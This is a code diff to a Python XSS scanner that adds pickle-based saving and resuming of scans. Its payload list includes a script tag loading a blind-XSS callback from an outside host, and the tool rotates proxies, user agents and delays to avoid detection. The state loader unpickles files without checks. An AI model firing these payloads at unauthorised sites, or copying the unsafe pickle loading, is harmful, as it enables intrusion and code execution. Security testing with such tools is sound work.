@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-XSS Cyber Champ Pro 2050 - Elite Edition
-Now with dynamic proxy/payload loading and protocol-aware scanning
+XSS Cyber Champ Pro 2050 - Elite Edition with Continuation Feature
+Now with scan state persistence and resumption capabilities
 """
 
 import asyncio
@@ -11,7 +11,10 @@ import time
 from datetime import datetime
 from pathlib import Path
 from urllib.parse import urlparse, parse_qs
-from typing import Dict, List, Optional
+from typing import Dict, List, Optional, Tuple
+import os
+import pickle
+import hashlib
 
 import httpx
 from playwright.async_api import async_playwright
@@ -22,16 +25,18 @@ from rich.progress import Progress, SpinnerColumn, TextColumn
 import argparse
 
 # ----------------------------- CONSTANTS -----------------------------
-VERSION = "2050.2-Elite"
+VERSION = "2050.3-Elite-Resume"
 BANNER = f"""
 [bold cyan]╔══════════════════════════════════════════════════╗
-║    [blink]XSS CYBER CHAMP PRO {VERSION}[/blink]      ║
-║  [italic]AI-Powered Next-Gen XSS Detection[/italic]  ║
-║            [blink] Made by Dev kumar [/blink]        ║
+║    [blink]XSS CYBER CHAMP PRO {VERSION}[/blink]        ║
+║  [italic]AI-Powered Next-Gen XSS Detection[/italic]    ║
+║         [blink][bold]Made By Dev Kumar[/bold][/blink]  ║
 ╚══════════════════════════════════════════════════╝[/bold cyan]
 """
 
 console = Console()
+LOG_DIR = "scan_logs"
+os.makedirs(LOG_DIR, exist_ok=True)
 
 # ----------------------------- DEFAULT PAYLOADS -----------------------------
 DEFAULT_PAYLOADS = [
@@ -60,21 +65,75 @@ DEFAULT_PAYLOADS = [
     '"><script src=http://xss.report/yourid></script>'
 ]
 
-# ----------------------------- DEFAULT PROXIES -----------------------------
-DEFAULT_PROXIES = [
-    "185.226.204.160:5713",
-    "103.210.206.26:8080",
-    "156.228.116.140:3128",
-    "162.220.246.225:6509",
-    "72.10.160.93:12649",
-    "103.218.24.67:58080",
-    "188.253.112.218:80",
-    "156.228.115.84:3128",
-    "108.170.12.11:80",
-    "18.134.236.231:1080"
-]
-
 # ----------------------------- CLASSES -----------------------------
+class ScanState:
+    """Class to manage scan state persistence and resumption"""
+    def __init__(self, scanner: 'XSSScanner'):
+        self.scanner = scanner
+        self.state_file = ""
+        self.scan_hash = ""
+        
+    def generate_scan_hash(self, url: str) -> str:
+        """Generate unique hash for this scan based on target URL and timestamp"""
+        hash_input = f"{url}-{datetime.now().timestamp()}"
+        return hashlib.md5(hash_input.encode()).hexdigest()
+    
+    async def save_state(self) -> bool:
+        """Save current scan state to file"""
+        if not self.state_file:
+            return False
+            
+        state = {
+            'scan_hash': self.scan_hash,
+            'target_url': getattr(self.scanner, 'target_url', ''),
+            'results': self.scanner.results,
+            'injection_points': self.scanner.injection_points,
+            'tested_payloads': getattr(self.scanner, 'tested_payloads', set()),
+            'remaining_payloads': [p for p in self.scanner.payloads 
+                                  if p not in getattr(self.scanner, 'tested_payloads', set())],
+            'scan_mode': getattr(self.scanner, 'scan_mode', 'active'),
+            'scan_type': getattr(self.scanner, 'scan_type', 'reflected'),
+            'post_data': getattr(self.scanner, 'post_data', None),
+            'proxy_protocol': getattr(self.scanner, 'proxy_protocol', 'http'),
+            'start_time': getattr(self.scanner, 'start_time', time.time()),
+            'scan_duration': getattr(self.scanner, 'scan_duration', 0)
+        }
+        
+        try:
+            with open(self.state_file, 'wb') as f:
+                pickle.dump(state, f)
+            return True
+        except Exception as e:
+            console.print(f"[red]✗ Failed to save scan state: {e}[/red]")
+            return False
+    
+    async def load_state(self, state_file: str) -> bool:
+        """Load scan state from file"""
+        try:
+            with open(state_file, 'rb') as f:
+                state = pickle.load(f)
+                
+            self.scanner.results = state.get('results', [])
+            self.scanner.injection_points = state.get('injection_points', [])
+            self.scanner.payloads = state.get('remaining_payloads', []) + state.get('tested_payloads', [])
+            self.scanner.tested_payloads = set(state.get('tested_payloads', []))
+            self.scanner.scan_mode = state.get('scan_mode', 'active')
+            self.scanner.scan_type = state.get('scan_type', 'reflected')
+            self.scanner.post_data = state.get('post_data', None)
+            self.scanner.proxy_protocol = state.get('proxy_protocol', 'http')
+            self.scanner.start_time = state.get('start_time', time.time())
+            self.scanner.target_url = state.get('target_url', '')
+            self.scan_hash = state.get('scan_hash', '')
+            self.state_file = state_file
+            
+            console.print(f"[green]✓ Loaded scan state from {state_file}[/green]")
+            console.print(f"  - Resume point: {len(state.get('tested_payloads', []))}/{len(self.scanner.payloads)} payloads tested")
+            console.print(f"  - Findings so far: {len(self.scanner.results)}")
+            return True
+        except Exception as e:
+            console.print(f"[red]✗ Failed to load scan state: {e}[/red]")
+            return False
+
 class ProxyEngine:
     """Advanced proxy management with protocol support"""
     def __init__(self):
@@ -119,20 +178,82 @@ class ProxyEngine:
             return f"socks5://{proxy}"
         return None
 
+    async def verify_proxies(self):
+        """Verify and activate proxy list"""
+        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}")) as progress:
+            tasks = {}
+            
+            # Create progress tasks for each protocol
+            for protocol, proxies in self.proxies.items():
+                if proxies:
+                    tasks[protocol] = progress.add_task(
+                        f"[cyan]Verifying {protocol.upper()} proxies...", 
+                        total=len(proxies)
+                    )
+
+            # Verify proxies asynchronously
+            async def check_proxy(proxy: str, protocol: str):
+                try:
+                    async with httpx.AsyncClient(
+                        proxies={protocol: proxy},
+                        timeout=10
+                    ) as client:
+                        response = await client.get("http://httpbin.org/ip")
+                        if response.status_code == 200:
+                            return True
+                except:
+                    return False
+                return False
+
+            # Run verification
+            verified = {proto: [] for proto in self.proxies}
+            
+            for protocol, proxies in self.proxies.items():
+                if not proxies:
+                    continue
+                    
+                for proxy in proxies:
+                    proxy_url = f"{protocol}://{proxy}"
+                    if await check_proxy(proxy_url, protocol):
+                        verified[protocol].append(proxy)
+                    progress.update(tasks[protocol], advance=1)
+
+            # Update verified proxies
+            self.proxies = verified
+            
+            # Print results
+            for protocol, proxies in verified.items():
+                if proxies:
+                    console.print(f"[green]✓ {len(proxies)} {protocol.upper()} proxies verified[/green]")
+
 class XSSScanner:
     def __init__(self):
         self.results = []
         self.injection_points = []
         self.payloads = DEFAULT_PAYLOADS
+        self.tested_payloads = set()
         self.proxy_engine = ProxyEngine()
         self.session = None
         self.browser = None
         self.context = None
+        self.playwright = None
+        self.state_manager = ScanState(self)
+        self.scan_mode = "active"
+        self.scan_type = "reflected"
+        self.post_data = None
+        self.proxy_protocol = "http"
+        self.target_url = ""
+        self.start_time = 0
+        self.scan_duration = 0
 
     async def init(self, proxy_protocol: str = 'http'):
         """Initialize scanner components"""
         self.proxy_protocol = proxy_protocol
-        await self._verify_proxies()
+        
+        # Verify proxies if any are loaded
+        if any(self.proxy_engine.proxies.values()):
+            await self.proxy_engine.verify_proxies()
+        
         self.session = httpx.AsyncClient(timeout=30)
         
         # Init headless browser with proxy if available
@@ -151,6 +272,17 @@ class XSSScanner:
             ignore_https_errors=True,
             user_agent=self._get_random_user_agent()
         )
+
+    async def close(self):
+        """Cleanup resources"""
+        if self.session:
+            await self.session.aclose()
+        if self.context:
+            await self.context.close()
+        if self.browser:
+            await self.browser.close()
+        if self.playwright:
+            await self.playwright.stop()
 
     def _get_random_user_agent(self) -> str:
         """Generate random modern user agent"""
@@ -184,61 +316,9 @@ class XSSScanner:
             console.print(f"[red]✗ Failed to load payloads: {e}[/red]")
             return False
 
-    async def _verify_proxies(self):
-        """Verify and activate proxy list"""
-        if not any(self.proxy_engine.proxies.values()):
-            # Load default proxies if none provided
-            self.proxy_engine.proxies['http'] = DEFAULT_PROXIES
-            console.print("[yellow]⚠ Using default HTTP proxies[/yellow]")
-
-        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}")) as progress:
-            tasks = {}
-            
-            # Create progress tasks for each protocol
-            for protocol, proxies in self.proxy_engine.proxies.items():
-                if proxies:
-                    tasks[protocol] = progress.add_task(
-                        f"[cyan]Verifying {protocol.upper()} proxies...", 
-                        total=len(proxies)
-                    )
-
-            # Verify proxies asynchronously
-            async def check_proxy(proxy: str, protocol: str):
-                try:
-                    async with httpx.AsyncClient(
-                        proxies={protocol: proxy},
-                        timeout=10
-                    ) as client:
-                        response = await client.get("http://httpbin.org/ip")
-                        if response.status_code == 200:
-                            return True
-                except:
-                    return False
-                return False
-
-            # Run verification
-            verified = {proto: [] for proto in self.proxy_engine.proxies}
-            
-            for protocol, proxies in self.proxy_engine.proxies.items():
-                if not proxies:
-                    continue
-                    
-                for proxy in proxies:
-                    proxy_url = f"{protocol}://{proxy}"
-                    if await check_proxy(proxy_url, protocol):
-                        verified[protocol].append(proxy)
-                    progress.update(tasks[protocol], advance=1)
-
-            # Update verified proxies
-            self.proxy_engine.proxies = verified
-            
-            # Print results
-            for protocol, proxies in verified.items():
-                if proxies:
-                    console.print(f"[green]✓ {len(proxies)} {protocol.upper()} proxies verified[/green]")
-
     async def passive_scan(self, url: str):
         """Enhanced passive scan with parameter analysis"""
+        self.target_url = url
         console.print(f"[yellow]🔍 Starting passive scan for {url}[/yellow]")
         
         parsed = urlparse(url)
@@ -317,6 +397,7 @@ class XSSScanner:
 
     async def dom_monitor(self, url: str, timeout: int = 30):
         """Advanced DOM monitoring with behavior analysis"""
+        self.target_url = url
         console.print(f"[yellow]👁️ Starting DOM monitor for {url} (timeout: {timeout}s)[/yellow]")
         
         findings = []
@@ -424,7 +505,17 @@ class XSSScanner:
             await page.close()
 
     async def active_scan(self, url: str, mode: str = "reflected", post_data: Optional[str] = None):
-        """Advanced active scanning with protocol-aware proxies"""
+        """Advanced active scanning with state persistence"""
+        self.target_url = url
+        self.scan_mode = "active"
+        self.scan_type = mode
+        self.post_data = post_data
+        
+        # Initialize state file if not resuming
+        if not self.state_manager.state_file:
+            self.state_manager.scan_hash = self.state_manager.generate_scan_hash(url)
+            self.state_manager.state_file = os.path.join(LOG_DIR, f"{self.state_manager.scan_hash}.state")
+        
         console.print(f"[yellow]🚀 Starting active {mode} XSS scan for {url}[/yellow]")
         
         if mode == "reflected":
@@ -437,11 +528,14 @@ class XSSScanner:
             console.print(f"[red]Unknown scan mode: {mode}[/red]")
 
     async def _scan_reflected(self, url: str):
-        """Enhanced reflected XSS scanning with proxy rotation"""
+        """Enhanced reflected XSS scanning with state persistence"""
         semaphore = asyncio.Semaphore(10)  # Limit concurrent requests
         
         async def test_payload(payload: str):
             async with semaphore:
+                if payload in self.tested_payloads:
+                    return
+                    
                 test_url = url.replace("FUZZ", payload)
                 proxy = self.proxy_engine.get_random_proxy(self.proxy_protocol)
                 
@@ -480,7 +574,10 @@ class XSSScanner:
                 except Exception as e:
                     console.print(f"[red]Error testing {payload}: {e}[/red]")
                 
-                await asyncio.sleep(random.uniform(0.3, 1.2))  # Randomized delay
+                finally:
+                    self.tested_payloads.add(payload)
+                    await self.state_manager.save_state()
+                    await asyncio.sleep(random.uniform(0.3, 1.2))  # Randomized delay
         
         with Progress() as progress:
             task = progress.add_task("[cyan]Scanning...", total=len(self.payloads))
@@ -488,8 +585,9 @@ class XSSScanner:
             # Run all payload tests concurrently with throttling
             tasks = []
             for payload in self.payloads:
-                tasks.append(test_payload(payload))
-                progress.update(task, advance=1)
+                if payload not in self.tested_payloads:
+                    tasks.append(test_payload(payload))
+                    progress.update(task, advance=1)
             
             await asyncio.gather(*tasks)
 
@@ -524,6 +622,9 @@ class XSSScanner:
                 return
             
             for payload in self.payloads:
+                if payload in self.tested_payloads:
+                    continue
+                    
                 try:
                     # Prepare payload data
                     data_pairs = post_data.replace("FUZZ", payload).split("&")
@@ -557,6 +658,9 @@ class XSSScanner:
                 
                 except Exception as e:
                     console.print(f"[red]Error testing stored XSS: {e}[/red]")
+                finally:
+                    self.tested_payloads.add(payload)
+                    await self.state_manager.save_state()
         
         finally:
             await page.close()
@@ -584,16 +688,20 @@ class XSSScanner:
             console.print(f"\n[bold]Summary:[/bold]")
             console.print(f"  Injection Points: {len(self.injection_points)}")
             console.print(f"  Vulnerabilities: {len(self.results)}")
+            console.print(f"  Tested Payloads: {len(self.tested_payloads)}/{len(self.payloads)}")
+            console.print(f"  Scan Duration: {self.scan_duration:.2f} seconds")
         
         elif format == "json":
             report = {
                 "metadata": {
                     "scan_date": datetime.now().isoformat(),
                     "tool_version": VERSION,
-                    "scan_duration": getattr(self, "scan_duration", 0)
+                    "scan_duration": self.scan_duration,
+                    "scan_hash": self.state_manager.scan_hash,
+                    "resumable": bool(self.state_manager.state_file)
                 },
                 "target": {
-                    "url": getattr(self, "target_url", "unknown"),
+                    "url": self.target_url,
                     "injection_points": self.injection_points
                 },
                 "results": [
@@ -606,6 +714,8 @@ class XSSScanner:
                 ],
                 "stats": {
                     "total_payloads": len(self.payloads),
+                    "tested_payloads": len(self.tested_payloads),
+                    "remaining_payloads": len(self.payloads) - len(self.tested_payloads),
                     "tested_proxies": sum(len(p) for p in self.proxy_engine.proxies.values())
                 }
             }
@@ -646,6 +756,18 @@ class XSSScanner:
                         border: 1px solid #ddd;
                         border-radius: 4px;
                     }}
+                    .progress {{
+                        height: 20px;
+                        background: #f0f0f0;
+                        border-radius: 4px;
+                        margin: 10px 0;
+                    }}
+                    .progress-bar {{
+                        height: 100%;
+                        background: #4CAF50;
+                        border-radius: 4px;
+                        width: {((len(self.tested_payloads) / len(self.payloads)) * 100) if self.payloads else 0}%;
+                    }}
                 </style>
             </head>
             <body>
@@ -654,9 +776,16 @@ class XSSScanner:
                 
                 <div class="summary">
                     <h2>Scan Summary</h2>
-                    <p><strong>Target:</strong> {getattr(self, 'target_url', 'unknown')}</p>
+                    <p><strong>Target:</strong> {self.target_url}</p>
+                    <p><strong>Scan Mode:</strong> {self.scan_mode} ({self.scan_type})</p>
                     <p><strong>Injection Points Found:</strong> {len(self.injection_points)}</p>
                     <p><strong>Vulnerabilities Found:</strong> {len(self.results)}</p>
+                    <p><strong>Payload Progress:</strong> {len(self.tested_payloads)}/{len(self.payloads)}</p>
+                    <div class="progress">
+                        <div class="progress-bar"></div>
+                    </div>
+                    <p><strong>Scan Duration:</strong> {self.scan_duration:.2f} seconds</p>
+                    {"<p><strong>Resume Hash:</strong> " + self.state_manager.scan_hash + "</p>" if self.state_manager.scan_hash else ""}
                 </div>
                 
                 <h2>Injection Points</h2>
@@ -698,8 +827,8 @@ def extract_location(result: str) -> str:
 async def main():
     console.print(BANNER)
     
-    parser = argparse.ArgumentParser(description="XSS Cyber Champ Pro 2050 - Elite Edition")
-    parser.add_argument("url", help="Target URL (use FUZZ for injection point)")
+    parser = argparse.ArgumentParser(description="XSS Cyber Champ Pro 2050 - Elite Edition with Continuation")
+    parser.add_argument("url", nargs="?", help="Target URL (use FUZZ for injection point)")
     parser.add_argument("--mode", choices=["passive", "active", "dom"], default="active", 
                       help="Scan mode (default: active)")
     parser.add_argument("--type", choices=["reflected", "stored", "all"], default="reflected",
@@ -712,9 +841,21 @@ async def main():
     parser.add_argument("--output", help="Output file for report")
     parser.add_argument("--format", choices=["console", "json", "html"], default="console",
                       help="Report format (default: console)")
+    parser.add_argument("--continue", dest="resume", help="Continue from saved state file")
     args = parser.parse_args()
     
     scanner = XSSScanner()
+    
+    # Check if we're resuming a scan
+    if args.resume:
+        if await scanner.state_manager.load_state(args.resume):
+            args.url = scanner.target_url  # Use URL from saved state
+        else:
+            return
+    
+    if not args.url and not args.resume:
+        console.print("[red]✗ Error: Target URL is required for new scans[/red]")
+        return
     
     # Load custom payloads if specified
     if args.payloads:
@@ -727,7 +868,7 @@ async def main():
     await scanner.init(args.protocol if args.proxy else 'http')
     
     try:
-        start_time = time.time()
+        scanner.start_time = time.time()
         
         if args.mode == "passive":
             await scanner.passive_scan(args.url)
@@ -736,14 +877,21 @@ async def main():
         else:
             if args.type in ["reflected", "all"]:
                 await scanner.active_scan(args.url, "reflected")
-            if args.type in ["stored", "all"] and args.post:
-                await scanner.active_scan(args.url, "stored", args.post)
+            if args.type in ["stored", "all"] and (args.post or scanner.post_data):
+                await scanner.active_scan(args.url, "stored", args.post or scanner.post_data)
         
-        scanner.scan_duration = time.time() - start_time
+        scanner.scan_duration = time.time() - scanner.start_time
         scanner.generate_report(args.format, args.output)
     
+    except KeyboardInterrupt:
+        console.print("\n[yellow]⚠ Scan interrupted by user[/yellow]")
+        if scanner.state_manager.state_file:
+            console.print(f"[yellow]Scan state saved to {scanner.state_manager.state_file}[/yellow]")
+            console.print(f"Resume with: --continue {scanner.state_manager.state_file}")
     except Exception as e:
         console.print(f"[red]Critical error: {e}[/red]", style="bold")
+        if scanner.state_manager.state_file:
+            console.print(f"[yellow]Scan state saved to {scanner.state_manager.state_file}[/yellow]")
     finally:
         await scanner.close()
 
